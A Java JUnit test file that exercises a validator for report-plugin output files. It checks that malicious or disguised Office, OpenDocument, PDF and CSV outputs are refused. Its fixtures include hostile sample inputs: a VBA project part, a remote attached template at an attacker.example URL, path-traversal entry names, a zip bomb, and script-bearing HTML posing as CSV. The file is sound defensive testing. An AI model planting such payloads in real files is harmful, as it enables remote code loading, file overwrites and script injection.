package com.asmolabs.vectispire.common.domain.reportplugins;

import static com.asmolabs.vectispire.common.domain.reportplugins.ReportOutputFixtures.Part;
import static com.asmolabs.vectispire.common.domain.reportplugins.ReportOutputFixtures.relationship;
import static com.asmolabs.vectispire.common.domain.reportplugins.ReportOutputFixtures.relationships;
import static com.asmolabs.vectispire.common.domain.reportplugins.ReportOutputFixtures.zip;
import static org.assertj.core.api.Assertions.assertThat;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * The output checks of decision 0035 §3: each type's minimal real file passes, and each disguise — a macro part, a
 * macro-enabled workbook renamed, another type's package, a zip bomb, a page dressed as a CSV, a PDF cut short —
 * is refused with words saying why.
 */
@DisplayName("a report plugin's output, checked on its bytes")
class ReportOutputCheckTest {

    private static final long CEILING = ReportPluginManifest.MAX_OUTPUT_BYTES;

    private static ReportOutputCheck.Verdict check(ReportMediaType type, byte[] output) {
        return ReportOutputCheck.check(type, output, CEILING);
    }

    private static void accepted(ReportMediaType type, byte[] output) {
        assertThat(check(type, output)).isInstanceOf(ReportOutputCheck.Verdict.Accepted.class);
    }

    private static String refused(ReportMediaType type, byte[] output) {
        ReportOutputCheck.Verdict verdict = check(type, output);
        assertThat(verdict).isInstanceOf(ReportOutputCheck.Verdict.Refused.class);
        String why = ((ReportOutputCheck.Verdict.Refused) verdict).why();
        assertThat(why).startsWith("The output is not the " + type.wireName() + " its manifest declares: ");
        return why;
    }

    @ParameterizedTest(name = "{0}")
    @EnumSource(ReportMediaType.class)
    @DisplayName("each type's minimal real file is accepted as itself")
    void minimalFiles(ReportMediaType type) {
        accepted(type, ReportOutputFixtures.minimal().get(type));
    }

    @ParameterizedTest(name = "{0}")
    @EnumSource(ReportMediaType.class)
    @DisplayName("an empty file, and one over the manifest's ceiling, are nobody's document")
    void sizes(ReportMediaType type) {
        assertThat(refused(type, new byte[0])).contains("empty");
        byte[] file = ReportOutputFixtures.minimal().get(type);
        assertThat(ReportOutputCheck.check(type, file, file.length - 1))
                .isInstanceOfSatisfying(ReportOutputCheck.Verdict.Refused.class,
                        over -> assertThat(over.why()).contains("over the manifest's ceiling"));
    }

    @Nested
    @DisplayName("Office Open XML")
    class OfficeOpenXml {

        @Test
        @DisplayName("a VBA project part is refused by its name, whatever the content types say")
        void vbaProjectPart() {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put("xl/vbaProject.bin", new Part(new byte[] {1, 2, 3}, false));
            assertThat(refused(ReportMediaType.XLSX, zip(parts))).contains("VBA project");
        }

        @Test
        @DisplayName("a macro content type is refused, whatever the part is called")
        void macroContentType() {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put("[Content_Types].xml", Part.of(ReportOutputFixtures.contentTypes("xl/workbook.xml",
                    ReportOutputFixtures.XLSX_MAIN,
                    "<Override PartName=\"/xl/project.data\" ContentType=\"application/vnd.ms-office.vbaProject\"/>")));
            parts.put("xl/project.data", new Part(new byte[] {1, 2, 3}, false));
            assertThat(refused(ReportMediaType.XLSX, zip(parts))).contains("vnd.ms-office.vbaProject");
        }

        @Test
        @DisplayName("an ActiveX control is code too")
        void activeX() {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put("[Content_Types].xml", Part.of(ReportOutputFixtures.contentTypes("xl/workbook.xml",
                    ReportOutputFixtures.XLSX_MAIN,
                    "<Default Extension=\"ax\" ContentType=\"application/vnd.ms-office.activeX+xml\"/>")));
            assertThat(refused(ReportMediaType.XLSX, zip(parts))).contains("activeX");
        }

        @Test
        @DisplayName("an .xlsm renamed .xlsx is refused by its main part's type, even without its VBA project")
        void xlsmRenamed() {
            byte[] xlsm = zip(ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSM_MAIN));
            assertThat(refused(ReportMediaType.XLSX, xlsm)).contains("macroEnabled");
        }

        @Test
        @DisplayName("another Office type's package is refused: a document declared a workbook")
        void anotherType() {
            assertThat(refused(ReportMediaType.XLSX, ReportOutputFixtures.docx()))
                    .contains("its main part is of type")
                    .contains(ReportOutputFixtures.DOCX_MAIN);
            assertThat(refused(ReportMediaType.DOCX, ReportOutputFixtures.pptx())).contains("its main part is of type");
            assertThat(refused(ReportMediaType.PPTX, ReportOutputFixtures.xlsx())).contains("its main part is of type");
        }

        @Test
        @DisplayName("a package without content types, or without the main part it names, is no document")
        void incomplete() {
            LinkedHashMap<String, Part> noTypes = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            noTypes.remove("[Content_Types].xml");
            assertThat(refused(ReportMediaType.XLSX, zip(noTypes))).contains("[Content_Types].xml");

            LinkedHashMap<String, Part> noMain = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            noMain.remove("xl/workbook.xml");
            assertThat(refused(ReportMediaType.XLSX, zip(noMain))).contains("is not in the package");

            LinkedHashMap<String, Part> noRoot = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            noRoot.put("_rels/.rels", Part.of(relationships()));
            assertThat(refused(ReportMediaType.XLSX, zip(noRoot))).contains("names no main part");
        }

        @Test
        @DisplayName("an attached template fetched from a server is refused; a hyperlink is a link")
        void externalRelationships() {
            LinkedHashMap<String, Part> template = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            template.put("xl/_rels/workbook.xml.rels", Part.of(relationships(
                    relationship("rId1", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
                            "worksheets/sheet1.xml"),
                    "<Relationship Id=\"rId9\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/"
                            + "relationships/attachedTemplate\" Target=\"https://attacker.example/t.dotm\" "
                            + "TargetMode=\"External\"/>")));
            assertThat(refused(ReportMediaType.XLSX, zip(template))).contains("https://attacker.example/t.dotm");

            LinkedHashMap<String, Part> link = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            link.put("xl/worksheets/_rels/sheet1.xml.rels", Part.of(relationships(
                    "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/"
                            + "relationships/hyperlink\" Target=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3094\" "
                            + "TargetMode=\"External\"/>")));
            accepted(ReportMediaType.XLSX, zip(link));
        }

        @Test
        @DisplayName("a legacy binary Office file is refused before it is read as a zip")
        void legacy() {
            byte[] xls = new byte[512];
            byte[] magic = {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, (byte) 0xA1, (byte) 0xB1, 0x1A, (byte) 0xE1};
            System.arraycopy(magic, 0, xls, 0, magic.length);
            assertThat(refused(ReportMediaType.XLSX, xls)).contains("legacy binary Office");
            assertThat(refused(ReportMediaType.DOCX, ReportOutputFixtures.pdf())).contains("not a zip");
        }
    }

    @Nested
    @DisplayName("the zip guards")
    class ZipGuards {

        @Test
        @DisplayName("an entry inflating past the ratio is refused as the zip bomb it is")
        void ratio() {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put("xl/media/padding.bin", new Part(new byte[8 * 1024 * 1024], false));
            byte[] bomb = zip(parts);
            assertThat(bomb.length).as("eight MiB of zeros deflate to a few KiB").isLessThan(64 * 1024);
            assertThat(refused(ReportMediaType.XLSX, bomb)).contains("as a zip bomb does");
        }

        @Test
        @DisplayName("the entry count, an entry's size and the whole inflated size are each bounded")
        void bounds() {
            byte[] xlsx = ReportOutputFixtures.xlsx();
            assertThat(ReportOutputCheck.check(ReportMediaType.XLSX, xlsx, CEILING,
                    new GuardedZip.Limits(4, 1 << 20, 1 << 20, 100, 1 << 10)))
                    .isInstanceOfSatisfying(ReportOutputCheck.Verdict.Refused.class,
                            refused -> assertThat(refused.why()).contains("more than 4 entries"));
            assertThat(ReportOutputCheck.check(ReportMediaType.XLSX, xlsx, CEILING,
                    new GuardedZip.Limits(100, 200, 1 << 20, 100, 1 << 10)))
                    .isInstanceOfSatisfying(ReportOutputCheck.Verdict.Refused.class,
                            refused -> assertThat(refused.why()).contains("inflates past 200 bytes"));
            assertThat(ReportOutputCheck.check(ReportMediaType.XLSX, xlsx, CEILING,
                    new GuardedZip.Limits(100, 1 << 20, 900, 100, 1 << 10)))
                    .isInstanceOfSatisfying(ReportOutputCheck.Verdict.Refused.class,
                            refused -> assertThat(refused.why()).contains("its zip inflates past 900 bytes"));
        }

        @ParameterizedTest
        @ValueSource(strings = {"../evil.xml", "/etc/evil.xml", "xl\\evil.xml", "C:/evil.xml", "xl/../../evil.xml"})
        @DisplayName("a name that would write outside the archive is refused")
        void names(String name) {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put(name, Part.of("<x/>"));
            assertThat(refused(ReportMediaType.XLSX, zip(parts))).contains("outside the archive");
        }

        @Test
        @DisplayName("a name held twice, whatever its case, is refused")
        void twice() {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put("XL/Workbook.xml", Part.of("<x/>"));
            assertThat(refused(ReportMediaType.XLSX, zip(parts))).contains("twice");
        }

        @Test
        @DisplayName("an archive inside the archive is refused, by its name and by its bytes")
        void nested() {
            LinkedHashMap<String, Part> byName = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            byName.put("xl/embeddings/Book1.xlsm", Part.of("x"));
            assertThat(refused(ReportMediaType.XLSX, zip(byName))).contains("archive inside the document");

            LinkedHashMap<String, Part> byBytes = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            byBytes.put("xl/media/image1.png", new Part(ReportOutputFixtures.xlsx(), false));
            assertThat(refused(ReportMediaType.XLSX, zip(byBytes))).contains("archive inside the document");
        }

        @Test
        @DisplayName("a central directory naming another part than its local header is refused: the reader opens the directory")
        void directoryDisagrees() {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.workbookParts(ReportOutputFixtures.XLSX_MAIN);
            parts.put("xl/media/aaaaaaaaaaaa.bin", Part.of("benign"));
            byte[] file = zip(parts);
            // The second occurrence of the name is the central directory's: renamed there alone.
            byte[] name = "xl/media/aaaaaaaaaaaa.bin".getBytes(StandardCharsets.US_ASCII);
            int first = indexOf(file, name, 0);
            int second = indexOf(file, name, first + 1);
            assertThat(second).isPositive();
            byte[] renamed = "xl/media/vbaProject.bin".getBytes(StandardCharsets.US_ASCII);
            byte[] padded = Arrays.copyOf(renamed, name.length);
            Arrays.fill(padded, renamed.length, padded.length, (byte) 'x');
            System.arraycopy(padded, 0, file, second, padded.length);
            assertThat(refused(ReportMediaType.XLSX, file)).contains("central directory");
        }

        @Test
        @DisplayName("bytes after the archive's end are refused: the file is a zip and nothing else")
        void trailing() {
            byte[] xlsx = ReportOutputFixtures.xlsx();
            byte[] longer = Arrays.copyOf(xlsx, xlsx.length + 16);
            assertThat(refused(ReportMediaType.XLSX, longer)).contains("end-of-directory");
        }

        private static int indexOf(byte[] haystack, byte[] needle, int from) {
            outer:
            for (int i = from; i <= haystack.length - needle.length; i++) {
                for (int j = 0; j < needle.length; j++) {
                    if (haystack[i + j] != needle[j]) {
                        continue outer;
                    }
                }
                return i;
            }
            return -1;
        }
    }

    @Nested
    @DisplayName("OpenDocument")
    class OpenDocument {

        @Test
        @DisplayName("mimetype must come first, stored, and say exactly the declared type")
        void mimetype() {
            LinkedHashMap<String, Part> last = ReportOutputFixtures.openDocumentParts(ReportMediaType.ODS.wireName());
            Part mimetype = last.remove("mimetype");
            last.put("mimetype", mimetype);
            assertThat(refused(ReportMediaType.ODS, zip(last))).contains("first entry");

            LinkedHashMap<String, Part> behind = new LinkedHashMap<>();
            behind.put("Thumbnails/thumbnail.png", new Part(new byte[] {1, 2, 3}, true));
            behind.putAll(ReportOutputFixtures.openDocumentParts(ReportMediaType.ODS.wireName()));
            assertThat(refused(ReportMediaType.ODS, zip(behind))).as("stored, but not mimetype").contains("first entry");

            LinkedHashMap<String, Part> deflated = ReportOutputFixtures.openDocumentParts(ReportMediaType.ODS.wireName());
            deflated.put("mimetype", new Part(ReportMediaType.ODS.wireName().getBytes(StandardCharsets.US_ASCII), false));
            assertThat(refused(ReportMediaType.ODS, zip(deflated))).contains("stored uncompressed");

            assertThat(refused(ReportMediaType.ODS, ReportOutputFixtures.odt())).contains("opendocument.text");
            assertThat(refused(ReportMediaType.ODT, ReportOutputFixtures.xlsx())).contains("first entry");
        }

        @ParameterizedTest
        @ValueSource(strings = {"Basic/Standard/Module1.xml", "Scripts/python/run.py"})
        @DisplayName("a Basic or script library is refused")
        void macros(String library) {
            LinkedHashMap<String, Part> parts = ReportOutputFixtures.openDocumentParts(ReportMediaType.ODT.wireName());
            parts.put(library, Part.of("<x/>"));
            assertThat(refused(ReportMediaType.ODT, zip(parts))).contains("macro or script library");
        }
    }

    @Nested
    @DisplayName("PDF")
    class Pdf {

        @Test
        @DisplayName("a PDF cut short has no %%EOF, and is refused")
        void truncated() {
            byte[] pdf = ReportOutputFixtures.pdf();
            assertThat(refused(ReportMediaType.PDF, Arrays.copyOf(pdf, pdf.length - 8))).contains("%%EOF");
        }

        @Test
        @DisplayName("%%EOF further back than the last kilobyte is not a trailer: something follows it")
        void appended() {
            byte[] pdf = ReportOutputFixtures.pdf();
            byte[] padded = Arrays.copyOf(pdf, pdf.length + 1025);
            Arrays.fill(padded, pdf.length, padded.length, (byte) ' ');
            assertThat(refused(ReportMediaType.PDF, padded)).contains("%%EOF");
            byte[] within = Arrays.copyOf(pdf, pdf.length + 1000);
            Arrays.fill(within, pdf.length, within.length, (byte) ' ');
            accepted(ReportMediaType.PDF, within);
        }

        @Test
        @DisplayName("a file without the PDF header is refused, whatever it ends with")
        void header() {
            assertThat(refused(ReportMediaType.PDF, "%PDF-3.0\n%%EOF\n".getBytes(StandardCharsets.US_ASCII)))
                    .contains("%PDF-1.");
            assertThat(refused(ReportMediaType.PDF, ReportOutputFixtures.xlsx())).contains("%PDF-1.");
            accepted(ReportMediaType.PDF, "%PDF-2.0\n%%EOF".getBytes(StandardCharsets.US_ASCII));
        }
    }

    @Nested
    @DisplayName("CSV and plain text")
    class Text {

        @Test
        @DisplayName("invalid UTF-8 is refused")
        void invalidUtf8() {
            byte[] latin1 = "Café,1\n".getBytes(StandardCharsets.ISO_8859_1);
            assertThat(refused(ReportMediaType.CSV, latin1)).contains("not valid UTF-8");
            assertThat(refused(ReportMediaType.TEXT, new byte[] {'a', (byte) 0xC3})).contains("not valid UTF-8");
        }

        @Test
        @DisplayName("a NUL byte is refused")
        void nul() {
            assertThat(refused(ReportMediaType.CSV, new byte[] {'a', ',', 0, '\n'})).contains("NUL");
        }

        @ParameterizedTest
        @ValueSource(strings = {"<!DOCTYPE html><html><body>x</body></html>", "<html>\n<script>alert(1)</script>",
                "\uFEFF \n\t<SCRIPT>alert(1)</SCRIPT>", "<!-- --><b>x</b>", "<?xml version=\"1.0\"?><svg/>",
                "<a href=\"x\">click</a>", "<p>x</p>"})
        @DisplayName("a page dressed as a CSV is refused: HTML is the type no plugin produces")
        void htmlAsCsv(String page) {
            assertThat(refused(ReportMediaType.CSV, page.getBytes(StandardCharsets.UTF_8))).contains("HTML");
        }

        @ParameterizedTest
        @ValueSource(strings = {"a<b,c\n", "<abbr,count\n1,2\n", "<= 5,low\n", "<pre-release>,x\n"})
        @DisplayName("text that merely holds a '<' is text")
        void notMarkup(String text) {
            accepted(ReportMediaType.CSV, text.getBytes(StandardCharsets.UTF_8));
        }
    }

    @Test
    @DisplayName("a type's refusal names the declared type, in the words the run's detail carries")
    void words() {
        assertThat(refused(ReportMediaType.ODS, Map.of("x", 1).toString().getBytes(StandardCharsets.UTF_8)))
                .contains("application/vnd.oasis.opendocument.spreadsheet");
    }
}
